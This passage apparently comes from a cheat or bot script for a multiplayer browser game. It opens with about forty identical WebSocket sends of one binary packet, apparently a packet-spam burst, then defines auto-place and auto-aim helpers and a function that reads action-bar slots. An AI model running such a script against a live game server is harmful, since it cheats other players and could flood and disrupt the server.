                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
               ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
    update();
            }
        }
    }
}

function place(id, angle = Math.atan2(mouseY - height / 2, mouseX - width / 2)) {
    doNewSend(["5", [id, null]]);
    doNewSend(["c", [1, angle]]);
    doNewSend(["c", [0, angle]]);
    doNewSend(["5", [myPlayer.weapon, true]]);
}

function placeQ(id, angle = Math.atan2(mouseY - height / 2, mouseX - width / 2)) {
    doNewSend(["5", [id, null]]);
    doNewSend(["c", [1, boostDir]]);
    doNewSend(["c", [0, boostDir]]);
    doNewSend(["5", [myPlayer.weapon, true]]);
    doNewSend(["2", [nearestEnemyAngle]]);
}

function put(id, angle = Math.atan2(mouseY - height / 2, mouseX - width / 2)) {
        doNewSend(["5", [id, null]]);
        doNewSend(["c", [1, angle]]);
        doNewSend(["c", [0, angle]]);
        doNewSend(["5", [myPlayer.weapon, true]]);
    }}
function isElementVisible(e) {
    return (e.offsetParent !== null);
}
function update() {
    for (let i=0;i<9;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            primary = i;
        }
    }
    for (let i=9;i<16;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            secondary = i;
        }
    }

    for (let i=16;i<19;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            foodType = i - 16;
        }
    }

    for (let i=19;i<22;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            wallType = i - 16;
        }
    }

    for (let i=22;i<26;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            spikeType = i - 16;
        }
    }

    for (let i=26;i<29;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            millType = i - 16;
        }
    }

    for (let i=29;i<31;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            mineType = i - 16;
        }
    }

    for (let i=31;i<33;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
            boostType = i - 16;
        }
    }

   for (let i=33;i<36;i++){
       if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
           turretType = i - 16;
       }
   }

   for (let i=36;i<37;i++){
       if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
           spawnpadType = i - 16;
       }
   }

   for (let i=37;i<39;i++){
       if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){
           turretType = i - 16;
       }
   }
}
